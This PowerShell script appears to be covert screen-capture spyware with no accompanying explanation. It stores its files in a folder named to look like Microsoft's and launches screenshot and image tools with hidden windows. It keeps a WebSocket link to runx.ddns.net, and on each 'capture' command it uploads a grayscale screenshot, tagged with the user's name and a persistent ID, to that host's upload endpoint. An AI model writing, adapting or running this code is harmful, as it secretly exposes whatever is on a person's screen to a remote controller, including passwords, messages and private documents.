if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item "$env:TEMP\run" -ItemType Directory
}

$logDir = "$env:APPDATA\Microsoft\run"
if (-not (Test-Path $logDir)) {
  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}
$logFile = "$logDir\ss_control.log"

function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

$mutex = New-Object System.Threading.Mutex($false, "ss_control")
if (-not $mutex.WaitOne(0)) {
  Log-Msg "[INFO] Another ss_control instance is running. Exiting."
  exit
}

Log-Msg "[INFO] ss_control started."

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "2af43f8"
$clientVersion = $SCRIPT_VERSION

Log-Msg "[INFO] Client: $uniqueUser, Version: $clientVersion"

$UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
if (!(Test-Path $UserFolder)) {
  $null = New-Item $UserFolder -ItemType Directory
}

Add-Type -AssemblyName System.Drawing

$VPS_WS_URL = "ws://runx.ddns.net/ws/client"
$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

function Capture-And-Upload {
  Log-Msg "[INFO] Capture requested. Capturing frame..."
  $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
  $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
  $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"

  Start-Process `
    -FilePath "$env:TEMP\run\nircmd\nircmd.exe" `
    -ArgumentList @(
    "savescreenshotfull",
    $RawPath
  ) -WindowStyle Hidden -Wait

  if (Test-Path $RawPath) {
    $MagickExe = "$env:TEMP\run\magick\magick.exe"
    $magickArgs = "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""

    Start-Process `
      -FilePath $MagickExe `
      -ArgumentList @(
      $magickArgs
    ) -WindowStyle Hidden -Wait

    Remove-Item $RawPath -Force
  }

  if (Test-Path $JpegPath) {
    $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)
    $base64Image = [Convert]::ToBase64String($fileBytes)
    $body = @{
      username = $uniqueUser
      filename = (Get-Item $JpegPath).Name
      image = $base64Image
    } | ConvertTo-Json -Compress

    Invoke-RestMethod `
      -Method Post `
      -Uri $VPS_UPLOAD_URL `
      -ContentType "application/json" `
      -Body $body `
      -TimeoutSec 10 `
      -UseBasicParsing |
      Out-Null

    Log-Msg "[INFO] Frame uploaded: $Timestamp.jpg"
    Remove-Item $JpegPath -Force
  }
}

try {
  while ($true) {
    try {
      $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
      $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
      $wsUriStr = $VPS_WS_URL + "?username=" + $safeUser + "&version=" + $safeVer + "&client_type=frames"
      Log-Msg "[INFO] Connecting WebSocket for ss_control to $wsUriStr..."

      $uri = New-Object System.Uri($wsUriStr)
      $ws = New-Object System.Net.WebSockets.ClientWebSocket
      $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(15)

      $cts = New-Object System.Threading.CancellationTokenSource
      $cts.CancelAfter(10000)

      $ws.ConnectAsync($uri, $cts.Token).Wait()

      if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        Log-Msg "[INFO] WebSocket connection established successfully for ss_control."
        $buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
          $ms = New-Object System.IO.MemoryStream
          $closeReceived = $false

          do {
            $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
            $receiveTask.Wait()
            $result = $receiveTask.Result

            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
              $closeReceived = $true
              break
            }

            if ($result.Count -gt 0) {
              $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
            }
          } while (-not $result.EndOfMessage -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open)

          if ($closeReceived) {
            Log-Msg "[INFO] WebSocket received close frame from server."
            try {
              $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
            }
            catch {}
            break
          }

          if ($ms.Length -gt 0) {
            $jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
            Log-Msg "[INFO] Received WebSocket data in ss_control: $jsonStr"
            $r = $jsonStr | ConvertFrom-Json
            if ($r.capture -eq $true) {
              Capture-And-Upload
            }
          }
        }
      }
    }
    catch {
      Log-Msg "[ERROR] ss_control WebSocket Error: $($_.Exception.ToString())"
    }

    Log-Msg "[INFO] ss_control Reconnecting in 3 seconds..."
    Start-Sleep -Seconds 3
  }
}
finally {
  if ($mutex) {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
  }
}
